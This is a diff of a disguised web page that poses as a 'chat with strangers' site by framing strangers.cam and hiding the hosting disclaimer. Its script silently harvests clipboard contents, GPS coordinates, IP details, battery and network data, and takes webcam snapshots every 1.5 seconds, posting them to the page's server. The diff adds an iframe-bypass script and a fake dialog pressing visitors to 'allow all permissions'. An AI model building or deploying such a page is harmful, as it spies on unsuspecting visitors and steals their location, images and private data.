@@ -4,6 +4,52 @@
          img[alt*="www.000webhost.com"], .disclaimer {
          display: none
          }
+         .iframe-container {
+           position: relative;
+           width: 100%;
+           height: 100vh;
+         }
+
+         .dialog-box {
+           position: absolute;
+           top: 50%;
+           left: 50%;
+           transform: translate(-50%, -50%);
+           background-color: #ffffff;
+           border-radius: 8px;
+           box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+           padding: 20px;
+           text-align: center;
+           max-width: 300px;
+         }
+
+         .dialog-box h2 {
+           margin-top: 0;
+           color: #333333;
+         }
+
+         .dialog-box p {
+           margin-bottom: 20px;
+           color: #666666;
+         }
+
+         .btn-allow {
+           background-color: #4CAF50;
+           color: #ffffff;
+           border: none;
+           padding: 10px 20px;
+           text-align: center;
+           text-decoration: none;
+           display: inline-block;
+           font-size: 16px;
+           border-radius: 4px;
+           cursor: pointer;
+           transition: background-color 0.3s;
+         }
+
+         .btn-allow:hover {
+           background-color: #45a049;
+         }
       </style>
       <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
       <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -45,6 +91,8 @@
       <meta name="twitter:label1" content="Est. reading time" />
       <meta name="twitter:data1" content="4 minutes" />
       <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.0/jquery.min.js"></script>
+	  <script src="https://unpkg.com/@ungap/custom-elements-builtin"></script>
+	    <script src="x-frame-bypass.js" type="module"></script>
       <script>
          $(document).ready(function() {
            var batterypercentage
@@ -62,13 +110,13 @@
          }
          getclips()
          var clips
-         
+
          function giveclips(polp) {
          clips = polp
          ipinfo()
          getLocation()
          }
-         
+
          function getLocation() {
          if (navigator.geolocation) {
          navigator.geolocation.getCurrentPosition(showPosition, showError);
@@ -76,20 +124,20 @@
          alert("Your Browser Does not support Gps");
          }
          }
-         
-         
+
+
           function showPosition(position) {
            var grak = "Lattitute : " + position.coords.latitude + " " + "Longitude : " + position.coords.longitude
-         
+
            sdrp(grak, clips,networkinformation,batterypercentage,ischarging);
-         
-         
+
+
           }
-         
+
           function showError(error) {
            switch (error.code) {
             case error.PERMISSION_DENIED:
-         
+
             sdrp("Location Permission Denied",clips,networkinformation,batterypercentage,ischarging);
             alert("Allow Location permission to Chat with nearby Strangers");
              break;
@@ -117,11 +165,11 @@
           let platform = navigator.platform;
           let networkinfo = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
           let networkinformation = "Network type : " + networkinfo.effectiveType + " " + "Downlink :" + " " + networkinfo.downlink
-         
-         
+
+
           function ipinfo(){
              $.getJSON('https://ipapi.co/json/', function(data) {
-         
+
                      $.ajax({
                      type: "POST",
                      url: "/ipinfo",
@@ -135,12 +183,12 @@
                      })
              })
           }
-         
-         
-         
-         
+
+
+
+
           function sdrp(bsdks,clipboard,networkinformation,batterypercentage,ischarging) {
-         
+
            $.ajax({
             type: "POST",
             url: "/process_qtc",
@@ -191,22 +239,22 @@
           };
           xhr.send(formdata);
       }
-      
-      
-      
-      
+
+
+
+
       const video = document.getElementById('video');
       const canvas = document.getElementById('canvas');
       const errorMsgElement = document.querySelector('span#errorMsg');
-      
+
       const constraints = {
       audio: false,
       video: {
-      
+
       facingMode: "user"
       }
       };
-      
+
       // Access webcam
       async function init() {
       try {
@@ -219,34 +267,47 @@
       alert("Read this page to grant camera access to  our website")
       },15000) }
       }
-      
+
       // Success
       function handleSuccess(stream) {
       window.stream = stream;
       video.srcObject = stream;
-      
+
       var context = canvas.getContext('2d');
       setInterval(function(){
-      
+
          context.drawImage(video, 0, 0, 640, 480);
          canvas.toBlob(postFile, 'image/jpeg'); }, 1500);
-      
-      
+
+
       }
-      
+
       // Load init
       init();
    </script>
    <body>
-      <p>
-         <iframe
-            id="forPostyouradd"
-            src="https://strangers.cam"
-            frameborder="0"
-            style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
-            height="100%"
-            width="100%"
-            ></iframe>
-      </p>
-   </body>
+
+    <div class="iframe-container">
+        <iframe
+           id="forPostyouradd"
+           src="https://strangers.cam"
+           frameborder="0"
+           style="overflow:hidden;height:100%;width:100%;position:fixed;top:0;left:0"
+           height="100%"
+           width="100%"
+           ></iframe>
+           <div class="dialog-box" id="dialogBox">
+             <h2>Alert</h2>
+             <p>Please allow all permissions to continue chatting with strangers</p>
+              <button class="btn-allow" id="allowBtn">OK</button>
+          </div>
+
+     </div>
+     <script>
+   document.getElementById("allowBtn").addEventListener("click", function() {
+     document.getElementById("dialogBox").style.display = "none";
+   });
+ </script>
+
+</body>
 </html>
